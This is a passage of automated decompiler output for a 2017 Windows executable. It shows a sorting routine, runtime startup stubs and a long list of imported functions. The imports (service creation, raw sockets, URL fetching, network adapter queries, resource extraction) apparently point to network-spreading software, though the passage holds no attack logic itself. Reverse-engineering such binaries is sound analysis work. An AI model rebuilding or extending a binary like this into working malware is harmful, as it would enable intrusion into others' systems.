        // 0x4097aa
        g3 = v3;
        return g1;
    }
    // branch -> 0x409767
    while (true) {
        int32_t * v6 = (int32_t *)v4; // 0x409767_0
        int32_t v7 = *v6; // 0x409767
        int32_t v8 = v7; // esi
        if (v7 < *(int32_t *)v1) {
            // 0x40978d
            g1 = v4;
            int32_t v9 = v7; // 0x4097a0
            int32_t v10 = v1; // 0x4097a0
            if (v1 != v4) {
                int32_t v11 = v4 - 4; // 0x40979325
                g1 = v11;
                *v6 = *(int32_t *)v11;
                if (v11 != v1) {
                    int32_t v12 = g1;
                    int32_t v13 = v12 - 4; // 0x409793
                    g1 = v13;
                    *(int32_t *)v12 = *(int32_t *)v13;
                    while (v13 != v2) {
                        // 0x409793
                        v12 = g1;
                        v13 = v12 - 4;
                        g1 = v13;
                        *(int32_t *)v12 = *(int32_t *)v13;
                        // continue -> 0x409793
                    }
                    // 0x4097a0
                    // branch -> 0x4097a0
                  lab_0x4097a0:
                    // 0x4097a0
                    *(int32_t *)v2 = v8;
                    // branch -> 0x4097a2
                  lab_0x4097a2_3:;
                    int32_t v14 = v5 + 4; // 0x4097a2
                    v5 = v14;
                    if (v14 == a2) {
                        // 0x4097a9
                        // branch -> 0x4097aa
                        // 0x4097aa
                        g3 = v3;
                        return g1;
                    }
                  lab_0x4097a2_4:
                    // 0x4097a2
                    v1 = v2;
                    v4 = v14;
                    // branch -> 0x409767
                    continue;
                }
                // branch -> 0x4097a0
                goto lab_0x4097a0;
            }
            // 0x4097a0
            *(int32_t *)v10 = v9;
            // branch -> 0x4097a2
            goto lab_0x4097a2_3;
        } else {
            int32_t v15 = v4 - 4; // 0x40976f
            uint32_t v16 = *(int32_t *)v15; // 0x40976f
            g1 = v15;
            int32_t v17 = v7; // 0x409789
            if (v7 < v16) {
                *(int32_t *)v4 = v16;
                int32_t v18 = g1; // 0x40977d
                int32_t v19 = v18 - 4; // 0x40977d
                uint32_t v20 = *(int32_t *)v19; // 0x40977d
                g1 = v19;
                while (v8 < v20) {
                    // 0x40977b
                    *(int32_t *)v18 = v20;
                    v18 = g1;
                    v19 = v18 - 4;
                    v20 = *(int32_t *)v19;
                    g1 = v19;
                    // continue -> 0x40977b
                }
                // 0x409789
                *(int32_t *)v18 = v8;
                // branch -> 0x4097a2
                goto lab_0x4097a2_3;
            }
            // 0x409789
            *(int32_t *)v4 = v17;
            // branch -> 0x4097a2
            goto lab_0x4097a2_3;
        }
    }
}

// Address range: 0x4097b0 - 0x4097fd
void function_4097b0(void) {
    // 0x4097b0
    unknown_40a144();
}

// Address range: 0x4097fe - 0x409809
int32_t function_4097fe(char * a1) {
    // 0x4097fe
    free(a1);
    return g1;
}

// Address range: 0x40980a - 0x409815
void function_40980a(void) {
    // 0x40980a
    unknown_40a180();
}

// Address range: 0x409816 - 0x409841
int32_t (**function_409816(int32_t (**a1)(), int32_t a2))() {
    // 0x409816
    if (g1180 == (void (****)())-1) {
        // 0x40981f
        return _onexit(a1);
    }
    // 0x40982b
    return __dllonexit(a1, (void (****)())&g1180, (void (****)())&g1179);
}

// Address range: 0x409842 - 0x40985f
void function_409842(int32_t a1) {
    // 0x409842
    int32_t v1;
    function_409816((int32_t (**)())a1, v1);
}

// Address range: 0x409860 - 0x40988f
int32_t function_409860(int32_t a1) {
    int32_t v1 = &a1; // 0x409866_0
    int32_t v2; // 0x409880
    int32_t v3; // 0x409880
    if (g1 >= 0x1000) {
        uint32_t v4 = g1 - 0x1000;
        int32_t v5 = v4 % 0x1000;
        v3 = v5;
        v2 = v1 - 0x1000 - (v4 - v5);
        // branch -> 0x409880
    } else {
        v3 = g1;
        v2 = v1;
    }
    // 0x409880
    int32_t result;
    g1 = result;
    *(int32_t *)(v2 - v3 - 4) = result;
    return result;
}

// Address range: 0x409890 - 0x40989f
void function_409890(void) {
    // 0x409890
    unknown_40a108();
}

// Address range: 0x409952 - 0x40995f
void function_409952(void) {
    // 0x409952
    return;
}

// Address range: 0x409a0a - 0x409a15
void function_409a0a(void) {
    // 0x409a0a
    unknown_40a120();
}

// Address range: 0x409a16 - 0x409b53
int32_t entry_point(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x409a16
    abort();
    // UNREACHABLE
}

// Address range: 0x409b54 - 0x409b67
int32_t function_409b54(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = *(int32_t *)(g2 - 20); // 0x409b54
    int32_t v2 = *(int32_t *)*(int32_t *)v1; // 0x409b59
    *(int32_t *)(g2 - 120) = v2;
    return _XcptFilter(v2, (char *)v1);
}

// Address range: 0x409b68 - 0x409b73
int32_t function_409b68(int32_t status) {
    int32_t v1 = *(int32_t *)(g2 - 24); // 0x409b68
    *(int32_t *)(v1 - 4) = *(int32_t *)(g2 - 120);
    *(int32_t *)(v1 - 8) = (int32_t)&g21;
    exit(status);
    // UNREACHABLE
}

// Address range: 0x409b74 - 0x409b8b
void function_409b74(void) {
    // 0x409b74
    unknown_40a100();
}

// Address range: 0x409b8c - 0x409b9d
int32_t function_409b8c(void) {
    int32_t result = _controlfp(0x10000, 0x30000); // 0x409b96
    g1 = result;
    return result;
}

// Address range: 0x409b9e - 0x409ba0
int32_t function_409b9e(void) {
    // 0x409b9e
    g1 = 0;
    return 0;
}

// Address range: 0x409ba1 - 0x409ba1
int32_t function_409ba1(void) {
    // 0x409ba1
    return g1;
}

// Address range: 0x409ba2 - 0x409bc9
int32_t function_409ba2(int32_t * a1) {
    // 0x409ba2
    return _except_handler3(NULL, (int32_t)a1, NULL, 0);
}

// --------------- Statically Linked Functions ----------------

// __int64 __alldiv(__int64 a, __int64 b);
// void __allrem(int32_t a1, int32_t a2, int32_t a3, int32_t a4);

// --------------- Dynamically Linked Functions ---------------

// _onexit_t __dllonexit(_onexit_t func, _PVFV ** pbegin, _PVFV ** pend);
// int * __cdecl __p___argc(void);
// uintptr_t __cdecl _beginthreadex(_In_opt_ void * Security, _In_ unsigned StackSize, _In_ _beginthreadex_proc_type StartAddress, _In_opt_ void * ArgList, _In_ unsigned InitFlag, _Out_opt_ unsigned * ThrdAddr);
// unsigned int __cdecl _controlfp(_In_ unsigned int NewValue, _In_ unsigned int Mask);
// void __cdecl _endthreadex(_In_ unsigned ReturnCode);
// int _except_handler3(PEXCEPTION_RECORD exception_record, PEXCEPTION_REGISTRATION registration, PCONTEXT context, PEXCEPTION_REGISTRATION dispatcher);
// void _ftol(void);
// _onexit_t _onexit(_onexit_t Function);
// void _qm__qm_0_Lockit_std__QAE_XZ(void);
// void _qm__qm_1_Lockit_std__QAE_XZ(void);
// void _qm__qm_2_YAPAXI_Z(int32_t a1);
// int __cdecl _stricmp(_In_z_ char const * String1, _In_z_ char const * String2);
// int _XcptFilter(unsigned long xcptnum, void * pxcptinfoptrs);
// BOOL ChangeServiceConfig2A(_In_ SC_HANDLE hService, _In_ DWORD dwInfoLevel, _In_opt_ LPVOID lpInfo);
// BOOL CloseHandle(_In_ HANDLE hObject);
// BOOL CloseServiceHandle(_In_ SC_HANDLE hSCObject);
// int closesocket(_In_ SOCKET s);
// int connect(_In_ SOCKET s, const struct sockaddr * name, _In_ int namelen);
// HANDLE CreateFileA(_In_ LPCSTR lpFileName, _In_ DWORD dwDesiredAccess, _In_ DWORD dwShareMode, _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes, _In_ DWORD dwCreationDisposition, _In_ DWORD dwFlagsAndAttributes, _In_opt_ HANDLE hTemplateFile);
// SC_HANDLE CreateServiceA(_In_ SC_HANDLE hSCManager, _In_ LPCSTR lpServiceName, _In_opt_ LPCSTR lpDisplayName, _In_ DWORD dwDesiredAccess, _In_ DWORD dwServiceType, _In_ DWORD dwStartType, _In_ DWORD dwErrorControl, _In_opt_ LPCSTR lpBinaryPathName, _In_opt_ LPCSTR lpLoadOrderGroup, _Out_opt_ LPDWORD lpdwTagId, _In_opt_ LPCSTR lpDependencies, _In_opt_ LPCSTR lpServiceStartName, _In_opt_ LPCSTR lpPassword);
// BOOL CryptGenRandom(_In_ HCRYPTPROV hProv, _In_ DWORD dwLen, BYTE * pbBuffer);
// VOID EnterCriticalSection(_Inout_ LPCRITICAL_SECTION lpCriticalSection);
// void exit(int status);
// VOID ExitProcess(_In_ UINT uExitCode);
// HRSRC FindResourceA(_In_opt_ HMODULE hModule, _In_ LPCSTR lpName, _In_ LPCSTR lpType);
// void free(void * ptr);
// ULONG GetAdaptersInfo(PIP_ADAPTER_INFO AdapterInfo, _Inout_ PULONG SizePointer);
// HANDLE GetCurrentThread(VOID);
// DWORD GetCurrentThreadId(VOID);
// DWORD GetFileSize(_In_ HANDLE hFile, _Out_opt_ LPDWORD lpFileSizeHigh);
// DWORD GetModuleFileNameA(_In_opt_ HMODULE hModule, LPSTR lpFilename, _In_ DWORD nSize);
// HMODULE GetModuleHandleW(_In_opt_ LPCWSTR lpModuleName);
// DWORD GetPerAdapterInfo(_In_ ULONG IfIndex, PIP_PER_ADAPTER_INFO pPerAdapterInfo, _Inout_ PULONG pOutBufLen);
// FARPROC GetProcAddress(_In_ HMODULE hModule, _In_ LPCSTR lpProcName);
// DWORD GetTickCount(VOID);
// HGLOBAL GlobalAlloc(_In_ UINT uFlags, _In_ SIZE_T dwBytes);
// HGLOBAL GlobalFree(HGLOBAL hMem);
// u_long htonl(_In_ u_long hostlong);
// u_short htons(_In_ u_short hostshort);
// unsigned long inet_addr(_In_z_ const char * cp);
// char * inet_ntoa(_In_ struct in_addr in);
// VOID InitializeCriticalSection(_Out_ LPCRITICAL_SECTION lpCriticalSection);
// unsigned InterlockedDecrement(_Inout_ unsigned volatile * Addend);
// BOOL InternetCloseHandle(_In_ HINTERNET hInternet);
// HINTERNET InternetOpenA(_In_ LPCSTR lpszAgent, _In_ DWORD dwAccessType, _In_ LPCSTR lpszProxyName, _In_ LPCSTR lpszProxyBypass, _In_ DWORD dwFlags);
// HINTERNET InternetOpenUrlA(_In_ HINTERNET hInternet, _In_ LPCSTR lpszUrl, _In_ LPCSTR lpszHeaders, _In_ DWORD dwHeadersLength, _In_ DWORD dwFlags, _In_ DWORD_PTR dwContext);
// int ioctlsocket(_In_ SOCKET s, _In_ long cmd, _Inout_ u_long * argp);
// VOID LeaveCriticalSection(_Inout_ LPCRITICAL_SECTION lpCriticalSection);
// HGLOBAL LoadResource(_In_opt_ HMODULE hModule, _In_ HRSRC hResInfo);
// HLOCAL LocalAlloc(_In_ UINT uFlags, _In_ SIZE_T uBytes);
// HLOCAL LocalFree(HLOCAL hMem);
// LPVOID LockResource(_In_ HGLOBAL hResData);
// BOOL MoveFileExA(_In_ LPCSTR lpExistingFileName, _In_opt_ LPCSTR lpNewFileName, _In_ DWORD dwFlags);
// u_long ntohl(_In_ u_long netlong);
// SC_HANDLE OpenSCManagerA(_In_opt_ LPCSTR lpMachineName, _In_opt_ LPCSTR lpDatabaseName, _In_ DWORD dwDesiredAccess);
// SC_HANDLE OpenServiceA(_In_ SC_HANDLE hSCManager, _In_ LPCSTR lpServiceName, _In_ DWORD dwDesiredAccess);
// BOOL QueryPerformanceCounter(_Out_ LARGE_INTEGER * lpPerformanceCount);
// BOOL QueryPerformanceFrequency(_Out_ LARGE_INTEGER * lpFrequency);
// int rand(void);
// int recv(_In_ SOCKET s, char * buf, _In_ int len, _In_ int flags);
// SERVICE_STATUS_HANDLE RegisterServiceCtrlHandlerA(_In_ LPCSTR lpServiceName, _In_ LPHANDLER_FUNCTION lpHandlerProc);
// int select(_In_ int nfds, _Inout_opt_ fd_set * readfds, _Inout_opt_ fd_set * writefds, _Inout_opt_ fd_set * exceptfds, _In_opt_ const struct timeval * timeout);
// int send(_In_ SOCKET s, const char * buf, _In_ int len, _In_ int flags);
// BOOL SetServiceStatus(_In_ SERVICE_STATUS_HANDLE hServiceStatus, _In_ LPSERVICE_STATUS lpServiceStatus);
// DWORD SizeofResource(_In_opt_ HMODULE hModule, _In_ HRSRC hResInfo);
// VOID Sleep(_In_ DWORD dwMilliseconds);
// SOCKET socket(_In_ int af, _In_ int type, _In_ int protocol);
// int sprintf(char * restrict s, const char * restrict format, ...);
// void srand(unsigned int seed);
// BOOL StartServiceA(_In_ SC_HANDLE hService, _In_ DWORD dwNumServiceArgs, LPCSTR * lpServiceArgVectors);
// BOOL StartServiceCtrlDispatcherA(_In_ const SERVICE_TABLE_ENTRYA * lpServiceStartTable);
// char * strncpy(char * restrict dest, const char * restrict src, size_t n);
// BOOL TerminateThread(_In_ HANDLE hThread, _In_ DWORD dwExitCode);
// time_t time(time_t * timer);
// DWORD WaitForSingleObject(_In_ HANDLE hHandle, _In_ DWORD dwMilliseconds);
// int WSAStartup(_In_ WORD wVersionRequested, _Out_ LPWSADATA lpWSAData);

// --------------------- Meta-Information ---------------------

// Detected compiler/packer: microsoft visual c++ (6.0)
// Detected functions: 79
// Decompiler release: v2.2.1 (2016-09-07)
// Decompilation date: 2017-05-16 10:13:39
